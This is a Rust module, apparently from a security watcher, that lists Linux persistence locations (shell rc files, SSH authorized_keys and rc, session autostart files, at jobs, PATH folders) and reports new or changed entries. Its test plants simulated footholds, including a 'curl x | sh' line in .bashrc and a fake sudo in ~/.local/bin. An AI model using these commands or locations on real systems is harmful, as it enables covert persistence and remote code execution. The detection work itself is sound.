//! What runs LATER on Linux, outside any agent sandbox, when the person logs in, opens a shell or
//! types a command — the places beside [`super::persistence`]'s that a program can be left in:
//!
//! * every user's shell startup files (`~/.bashrc`, `~/.profile`, `~/.zshrc` …);
//! * what OpenSSH runs or trusts at a login (`~/.ssh/rc`, `environment`, `authorized_keys`);
//! * the X and desktop session's start files (`~/.xprofile`, `~/.xsessionrc`, `~/.xinitrc`,
//!   `~/.pam_environment`, `~/.config/mimeapps.list`, the i3 / sway / Hyprland / Openbox ones);
//! * `at` jobs (`/var/spool/cron/atjobs` on Debian and Ubuntu, `/var/spool/at` on Fedora);
//! * the program folders commonly on the PATH: `/usr/local/bin`, `/usr/local/sbin`, Linuxbrew's,
//!   and per user `~/.local/bin`, `~/bin`, `~/.npm-global/bin`, `~/.cargo/bin`.
//!
//! The same marks and events as macOS's run-later watch (item kinds `shell-startup`, `ssh-login`,
//! `session-start`, `at-job`, `path-program`); the places are the plugin's ONE list (a parity test
//! in the plugin's suite holds them to `kernel.persistence_places`).

use std::fs;

use crate::platform::system_watch::items::{file_item, program_items, Item, MAX_PER_FOLDER};

/// The shell startup files of a user, under their home (as macOS's).
pub const SHELL_FILES: &[&str] = &[".zshenv", ".zprofile", ".zshrc", ".zlogin", ".zlogout", ".bash_profile", ".bash_login",
                                   ".bashrc", ".profile", ".bash_logout", ".config/fish/config.fish"];
/// OpenSSH's files of a user that run or trust something at a login into this machine.
pub const SSH_FILES: &[&str] = &[".ssh/rc", ".ssh/environment", ".ssh/authorized_keys", ".ssh/authorized_keys2"];
/// The X and desktop session's start files of a user. `~/.config/dconf/user` is left out: every
/// settings change the person makes rewrites it (the hook judgement still refuses an agent's write).
pub const SESSION_FILES: &[&str] = &[".xprofile", ".xsessionrc", ".xinitrc", ".xsession", ".pam_environment", ".config/mimeapps.list",
                                     ".config/i3/config", ".config/sway/config", ".config/hypr/hyprland.conf", ".config/openbox/autostart"];
/// Program folders on most PATHs (system-wide), and under each user's home.
pub const PROGRAM_FOLDERS: &[&str] = &["/usr/local/bin", "/usr/local/sbin", "/home/linuxbrew/.linuxbrew/bin", "/home/linuxbrew/.linuxbrew/sbin"];
pub const USER_PROGRAM_FOLDERS: &[&str] = &[".local/bin", "bin", ".npm-global/bin", ".cargo/bin"];
/// Where `at` keeps its jobs (Debian / Ubuntu, Fedora).
pub const AT_JOBS: &[&str] = &["/var/spool/cron/atjobs", "/var/spool/at"];

/// Every run-later item now, for the users at *homes* (see the module doc).
pub fn items(homes: &[String]) -> Vec<Item> {
    let mut items = Vec::new();
    for home in homes {
        for name in SHELL_FILES { file_item("shell-startup", &format!("{home}/{name}"), &mut items); }
        for name in SSH_FILES { file_item("ssh-login", &format!("{home}/{name}"), &mut items); }
        for name in SESSION_FILES { file_item("session-start", &format!("{home}/{name}"), &mut items); }
        for name in USER_PROGRAM_FOLDERS { program_items(&format!("{home}/{name}"), &mut items); }
    }
    for folder in PROGRAM_FOLDERS { program_items(folder, &mut items); }
    for folder in AT_JOBS {
        let Ok(entries) = fs::read_dir(folder) else { continue };
        // `at`'s own bookkeeping (`.SEQ`, `.lockfile`) is not a job (KI-615).
        for entry in entries.flatten().filter(|e| !e.file_name().to_string_lossy().starts_with('.')).take(MAX_PER_FOLDER) {
            file_item("at-job", &entry.path().display().to_string(), &mut items);
        }
    }
    items
}

/// The item kinds this module reports.
pub const KINDS: &[&str] = &["shell-startup", "ssh-login", "session-start", "at-job", "path-program"];

#[cfg(test)]
mod tests {
    use super::*;
    use crate::platform::system_watch::items::Persistence;

    #[test]
    fn a_session_file_a_path_program_and_a_new_key_after_the_baseline_are_events() {
        let home = std::env::temp_dir().join(format!("bb-linux-runlater-{}-{}", std::process::id(),
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        fs::create_dir_all(home.join(".local/bin")).unwrap();
        fs::create_dir_all(home.join(".ssh")).unwrap();
        fs::write(home.join(".bashrc"), "alias ll='ls -l'\n").unwrap();
        let homes = vec![home.display().to_string()];
        let mut watch = Persistence::default();
        watch.update(KINDS, items(&homes), 1);
        watch.baseline_done();
        fs::write(home.join(".xprofile"), "/tmp/x &\n").unwrap();
        fs::write(home.join(".local/bin/sudo"), "#!/bin/sh\n").unwrap();
        fs::write(home.join(".ssh/authorized_keys"), "ssh-ed25519 AAAA x\n").unwrap();
        fs::write(home.join(".bashrc"), "alias ll='ls -l'\ncurl x | sh\n").unwrap();
        assert!(watch.update(KINDS, items(&homes), 2));
        let seen: Vec<(String, String, String)> = watch.take_events().iter().map(|e| (e["kind"].as_str().unwrap().into(),
            e["item_kind"].as_str().unwrap().into(), e["label"].as_str().unwrap().into())).collect();
        for expected in [("persistence-new", "session-start", ".xprofile"), ("persistence-new", "path-program", "sudo"),
                         ("persistence-new", "ssh-login", "authorized_keys"), ("persistence-changed", "shell-startup", ".bashrc")] {
            assert!(seen.contains(&(expected.0.into(), expected.1.into(), expected.2.into())), "{expected:?} in {seen:?}");
        }
        let _ = fs::remove_dir_all(&home);
    }
}
